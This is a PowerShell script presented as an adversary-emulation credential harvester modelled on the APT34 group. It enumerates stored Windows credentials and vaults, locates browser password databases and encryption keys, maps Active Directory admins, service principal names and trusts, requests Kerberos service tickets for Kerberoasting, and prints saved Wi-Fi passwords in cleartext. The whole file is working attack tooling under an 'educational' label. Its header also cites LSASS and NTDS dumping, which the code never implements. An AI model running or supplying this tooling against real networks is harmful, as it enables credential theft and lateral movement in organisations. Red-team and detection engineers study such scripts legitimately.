# Helix Kitten (APT34/OilRig) - Credential Harvester
# PowerShell-based credential collection and AD enumeration
# MITRE ATT&CK: T1003.003 (NTDS), T1003.001 (LSASS), T1558.003 (Kerberoasting)

# For educational and research purposes only
# Author: Nour A
# Reference: https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-apt34.html

#Requires -Version 5.1

param(
    [switch]$All,
    [switch]$CredentialManager,
    [switch]$BrowserCreds,
    [switch]$DomainRecon,
    [switch]$Kerberoast,
    [switch]$WifiProfiles,
    [switch]$VaultEnum
)

$Banner = @"
=====================================================
HELIX KITTEN (APT34) - CREDENTIAL HARVESTER
Active Directory & Credential Collection Module
=====================================================
[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY
"@
Write-Host $Banner -ForegroundColor Red

# ---- Credential Manager Enumeration ----
function Invoke-CredentialManagerEnum {
    Write-Host "`n[STAGE] Credential Manager Enumeration" -ForegroundColor Cyan
    Write-Host ("-" * 50)
    Write-Host "  [+] MITRE: T1555.004 - Windows Credential Manager"

    # enumerate stored credentials
    try {
        $output = cmdkey /list 2>&1
        $targets = ($output | Select-String "Target:").Count
        Write-Host "  [+] Cached credentials: $targets"

        foreach ($line in $output) {
            if ($line -match "Target:\s*(.+)") {
                Write-Host "    - $($Matches[1].Trim())" -ForegroundColor Yellow
            }
        }
    } catch {
        Write-Host "  [!] Error enumerating credentials: $_" -ForegroundColor Red
    }

    # enumerate vault
    try {
        $vaults = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Vault" -ErrorAction SilentlyContinue
        if ($vaults) {
            Write-Host "  [+] Credential vaults found: $($vaults.Count)"
            foreach ($vault in $vaults) {
                Write-Host "    - $($vault.Name)" -ForegroundColor Yellow
            }
        }
    } catch {}
}

# ---- Browser Credential Paths ----
function Invoke-BrowserCredEnum {
    Write-Host "`n[STAGE] Browser Credential Enumeration" -ForegroundColor Cyan
    Write-Host ("-" * 50)
    Write-Host "  [+] MITRE: T1555.003 - Credentials from Web Browsers"

    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
    }

    foreach ($browser in $browsers.GetEnumerator()) {
        $exists = Test-Path $browser.Value
        $status = if ($exists) { "FOUND" } else { "NOT FOUND" }
        $color = if ($exists) { "Green" } else { "DarkGray" }
        Write-Host "  [$status] $($browser.Key): $($browser.Value)" -ForegroundColor $color

        if ($exists) {
            # check for credential databases
            $loginData = Join-Path $browser.Value "Default\Login Data"
            $cookies = Join-Path $browser.Value "Default\Cookies"
            $localState = Join-Path $browser.Value "Local State"

            if (Test-Path $loginData) {
                $size = (Get-Item $loginData).Length
                Write-Host "    Login Data: $size bytes" -ForegroundColor Yellow
            }
            if (Test-Path $cookies) {
                $size = (Get-Item $cookies).Length
                Write-Host "    Cookies: $size bytes" -ForegroundColor Yellow
            }
            if (Test-Path $localState) {
                # extract encryption key info
                try {
                    $json = Get-Content $localState -Raw | ConvertFrom-Json
                    $encKey = $json.os_crypt.encrypted_key
                    if ($encKey) {
                        Write-Host "    Master Key: Found ($([System.Convert]::FromBase64String($encKey).Length) bytes)" -ForegroundColor Yellow
                    }
                } catch {}
            }
        }
    }
}

# ---- Domain Reconnaissance ----
function Invoke-DomainRecon {
    Write-Host "`n[STAGE] Active Directory Reconnaissance" -ForegroundColor Cyan
    Write-Host ("-" * 50)
    Write-Host "  [+] MITRE: T1018 - Remote System Discovery"

    # domain information
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        Write-Host "  [+] Domain: $($domain.Name)" -ForegroundColor Green
        Write-Host "  [+] Forest: $($domain.Forest.Name)"
        Write-Host "  [+] Domain Controllers:"
        foreach ($dc in $domain.DomainControllers) {
            Write-Host "    - $($dc.Name) [$($dc.IPAddress)]" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  [!] Not domain joined or cannot reach DC" -ForegroundColor Red
        Write-Host "  [*] Falling back to nltest..."
        try {
            $nltest = nltest /dclist: 2>&1
            foreach ($line in $nltest) {
                if ($line.Trim()) {
                    Write-Host "    $($line.Trim())"
                }
            }
        } catch {}
    }

    # enumerate privileged groups
    Write-Host "`n  [+] Privileged Group Members:"
    $groups = @("Domain Admins", "Enterprise Admins", "Schema Admins",
                "Account Operators", "Backup Operators")

    foreach ($group in $groups) {
        try {
            $members = net group "$group" /domain 2>&1
            $count = ($members | Where-Object { $_ -match "^\w" -and $_ -notmatch "^The|^Group|^Comment|^Members|^-" }).Count
            if ($count -gt 0) {
                Write-Host "    [$group] $count member(s)" -ForegroundColor Yellow
            }
        } catch {}
    }

    # SPN enumeration (for Kerberoasting targets)
    Write-Host "`n  [+] Service Principal Names (SPN targets):"
    try {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname", "lastlogon"))

        $results = $searcher.FindAll()
        Write-Host "    Found $($results.Count) service accounts with SPNs"
        foreach ($result in $results) {
            $sam = $result.Properties["samaccountname"][0]
            $spns = $result.Properties["serviceprincipalname"]
            Write-Host "    - $sam" -ForegroundColor Yellow
            foreach ($spn in $spns) {
                Write-Host "      SPN: $spn" -ForegroundColor DarkYellow
            }
        }
        $results.Dispose()
    } catch {
        Write-Host "    [!] SPN enumeration failed: $_" -ForegroundColor Red
    }

    # trust relationships
    Write-Host "`n  [+] Domain Trust Relationships:"
    try {
        $trusts = nltest /domain_trusts /all_trusts 2>&1
        foreach ($line in $trusts) {
            if ($line -match "\w" -and $line -notmatch "^The command") {
                Write-Host "    $($line.Trim())" -ForegroundColor Yellow
            }
        }
    } catch {}
}

# ---- Kerberoasting ----
function Invoke-KerberoastEnum {
    Write-Host "`n[STAGE] Kerberoasting Preparation" -ForegroundColor Cyan
    Write-Host ("-" * 50)
    Write-Host "  [+] MITRE: T1558.003 - Kerberoasting"
    Write-Host "  [+] APT34 uses Kerberoasting to extract service account hashes"

    try {
        # request TGS tickets for service accounts
        Add-Type -AssemblyName System.IdentityModel

        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!(samaccountname=krbtgt)))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname"))

        $results = $searcher.FindAll()
        Write-Host "  [+] Kerberoastable accounts: $($results.Count)"

        foreach ($result in $results) {
            $sam = $result.Properties["samaccountname"][0]
            $spn = $result.Properties["serviceprincipalname"][0]

            Write-Host "    Target: $sam ($spn)" -ForegroundColor Yellow

            # request TGS ticket
            try {
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
                    -ArgumentList $spn
                Write-Host "      [+] TGS ticket obtained!" -ForegroundColor Green
            } catch {
                Write-Host "      [!] TGS request failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        $results.Dispose()
    } catch {
        Write-Host "  [!] Kerberoasting failed: $_" -ForegroundColor Red
    }
}

# ---- WiFi Profile Extraction ----
function Invoke-WifiProfileEnum {
    Write-Host "`n[STAGE] WiFi Profile Extraction" -ForegroundColor Cyan
    Write-Host ("-" * 50)
    Write-Host "  [+] MITRE: T1552.001 - Credentials in Files"

    try {
        $profiles = netsh wlan show profiles 2>&1
        $profileNames = ($profiles | Select-String "All User Profile\s*:\s*(.+)").Matches |
            ForEach-Object { $_.Groups[1].Value.Trim() }

        Write-Host "  [+] WiFi profiles found: $($profileNames.Count)"

        foreach ($name in $profileNames) {
            Write-Host "    Profile: $name" -ForegroundColor Yellow
            try {
                $detail = netsh wlan show profile name="$name" key=clear 2>&1
                $keyContent = ($detail | Select-String "Key Content\s*:\s*(.+)").Matches
                if ($keyContent) {
                    $key = $keyContent[0].Groups[1].Value.Trim()
                    Write-Host "      Key: $key" -ForegroundColor Red
                } else {
                    Write-Host "      Key: (not available)" -ForegroundColor DarkGray
                }

                $auth = ($detail | Select-String "Authentication\s*:\s*(.+)").Matches
                if ($auth) {
                    Write-Host "      Auth: $($auth[0].Groups[1].Value.Trim())"
                }
            } catch {}
        }
    } catch {
        Write-Host "  [!] WiFi enumeration failed: $_" -ForegroundColor Red
    }
}

# ---- Main Execution ----
Write-Host "`n[*] Starting credential harvesting..." -ForegroundColor White

if ($All -or $CredentialManager -or (-not $PSBoundParameters.Count)) {
    Invoke-CredentialManagerEnum
}
if ($All -or $BrowserCreds) {
    Invoke-BrowserCredEnum
}
if ($All -or $DomainRecon) {
    Invoke-DomainRecon
}
if ($All -or $Kerberoast) {
    Invoke-KerberoastEnum
}
if ($All -or $WifiProfiles) {
    Invoke-WifiProfileEnum
}

Write-Host "`n=====================================================" -ForegroundColor Red
Write-Host "[+] CREDENTIAL HARVESTING COMPLETE" -ForegroundColor Green
Write-Host "  Techniques demonstrated:" -ForegroundColor White
Write-Host "  - Windows Credential Manager enumeration"
Write-Host "  - Browser credential database discovery"
Write-Host "  - Active Directory reconnaissance (LDAP)"
Write-Host "  - SPN enumeration for Kerberoasting"
Write-Host "  - WiFi profile and key extraction"
Write-Host "=====================================================" -ForegroundColor Red
